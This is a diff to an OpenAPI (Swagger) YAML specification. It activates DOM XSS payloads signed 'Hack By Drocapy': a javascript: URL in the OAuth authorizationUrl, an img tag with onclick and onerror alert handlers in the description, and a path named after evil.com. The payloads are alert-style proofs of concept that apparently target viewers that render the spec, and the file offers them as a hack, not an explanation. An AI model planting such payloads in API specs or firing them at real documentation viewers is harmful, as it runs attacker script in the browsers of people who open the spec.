@@ -5,8 +5,8 @@ securityDefinitions:
     authorizationUrl: javascript:alert("XSS Hack By Drocapy")//
 info:
   version: "1.0.0"
-//  title: DOM XSS Hack & Javascript Code by Drocapy
-// description: Hack By Drocapy <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">////
+  title: DOM XSS Hack & Javascript Code by Drocapy
+ description: Hack By Drocapy <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">////
 paths:
   /Drocapy:
     get:
@@ -17,7 +17,7 @@ paths:
         - Drocapy
       operationId: find Accounts
       summary: Finds all accounts
-//  '/hack/hachid/{evil.com}':
+  '/hack/hachid/{evil.com}':
     delete:
       parameters:
         - description: 
@@ -30,6 +30,7 @@ paths:
       responses:
         '200':
           description: No response was specified
+
 
 
 
